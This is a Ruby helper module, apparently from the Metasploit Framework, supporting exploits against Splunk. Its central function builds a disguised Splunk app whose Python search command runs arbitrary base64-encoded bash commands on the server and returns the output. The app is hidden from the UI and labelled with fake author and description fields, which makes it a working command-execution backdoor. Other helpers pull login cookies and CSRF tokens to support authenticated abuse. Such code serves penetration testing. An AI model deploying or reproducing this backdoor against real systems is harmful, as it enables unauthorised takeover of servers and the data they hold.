# -*- coding: binary -*-

# Module with helper methods for other Splunk module methods
module Msf::Exploit::Remote::HTTP::Splunk::Helpers
  # Helper method to get tokens for login
  #
  # @param timeout [Integer] The maximum number of seconds to wait before the request times out
  # @return [String, nil] Post data to use for login
  def splunk_helper_extract_token(timeout = 20)
    res = send_request_cgi({
      'uri' => splunk_url_login,
      'method' => 'GET',
      'keep_cookies' => true
    }, timeout)

    unless res&.code == 200
      vprint_error('Unable to get login tokens')
      return nil
    end
    "session_id_#{datastore['RPORT']}=#{Rex::Text.rand_text_numeric(40)}; " << res.get_cookies
  end

  # Helper method to construct malicious app in .tar.gz form
  #
  # @param app_name [String] Name of app to upload
  # @return [Rex::Text] Malicious app in .tar.gz form
  def splunk_helper_malicious_app(app_name)
    # metadata folder
    metadata = <<~EOF
      [commands]
      export = system
    EOF

    # default folder
    commands_conf = <<~EOF
      [#{app_name}]
      type = python
      filename = #{app_name}.py
      local = false
      enableheader = false
      streaming = false
      perf_warn_limit = 0
    EOF

    app_conf = <<~EOF
      [launcher]
      author=#{Faker::Name.name}
      description=#{Faker::Lorem.sentence}
      version=#{Faker::App.version}

      [ui]
      is_visible = false
    EOF

    # bin folder
    msf_exec_py = <<~EOF
      import sys, base64, subprocess
      import splunk.Intersplunk

      header = ['result']
      results = []

      try:
        proc = subprocess.Popen(['/bin/bash', '-c', base64.b64decode(sys.argv[1]).decode()], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read()
        results.append({'result': base64.b64encode(output).decode('utf-8')})
      except Exception as e:
        error_msg = 'Error : ' + str(e)
        results = splunk.Intersplunk.generateErrorResults(error_msg)

      splunk.Intersplunk.outputResults(results, fields=header)
    EOF

    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file("#{app_name}/metadata/default.meta", 0o644) do |io|
        io.write metadata
      end
      tar.add_file("#{app_name}/default/commands.conf", 0o644) do |io|
        io.write commands_conf
      end
      tar.add_file("#{app_name}/default/app.conf", 0o644) do |io|
        io.write app_conf
      end
      tar.add_file("#{app_name}/bin/#{app_name}.py", 0o644) do |io|
        io.write msf_exec_py
      end
    end
    tarfile.rewind
    tarfile.close

    Rex::Text.gzip(tarfile.string)
  end

  # Filters a hash of Splunk apps based on provided attributes
  #
  # @param apps [Hash] A hash of apps where keys are app names and values are attribute hashes
  # @param filter [Hash] A hash of attributes to filter by (e.g., { status: 'enabled' })
  # @return [Hash] A hash of apps that match all filter criteria
  def filter_apps(apps, filter = {})
    apps.select do |_name, attributes|
      filter.all? { |key, value| attributes[key] == value }
    end
  end

  # Converts a cookie string into a hash
  #
  # @param cookie [String] Cookie string in the format "key1=value1; key2=value2"
  # @return [Hash] Hash mapping cookie names to their values
  def cookies_hash(cookie)
    return {} if cookie.nil? || cookie.empty?

    cookie.split(';').each_with_object({}) do |pair, hash|
      key, value = pair.split('=', 2)
      next if key.nil? || value.nil?

      hash[key.strip] = value.strip
    end
  end

  # Extracts the Splunk CSRF token from a cookie string
  #
  # @param cookie [String] Cookie string containing the CSRF token
  # @return [String, nil] The CSRF token for the current Splunk port, or nil if not found
  def extract_csrf_token(cookie)
    return nil if cookie.nil? || cookie.empty?

    cookies = cookies_hash(cookie)
    target_key = cookies.keys.find do |key|
      key =~ /^splunkweb_csrf_token_(\d+)$/
    end

    cookies[target_key] if target_key
  end

  # Extracts pagination parameters from the 'Next' link in the Splunk table.
  #
  # @param html [Nokogiri::HTML::Document] The HTML document to parse.
  # @return [Hash, nil] Returns a hash of GET parameters if a next page exists, otherwise nil.
  def extract_next_page_vars(html)
    next_link = html.at('li.next a')
    return nil unless next_link&.[]('href')

    begin
      query = URI.parse(next_link['href']).query
      query ? Rack::Utils.parse_query(query) : nil
    rescue URI::InvalidURIError
      nil
    end
  end
end
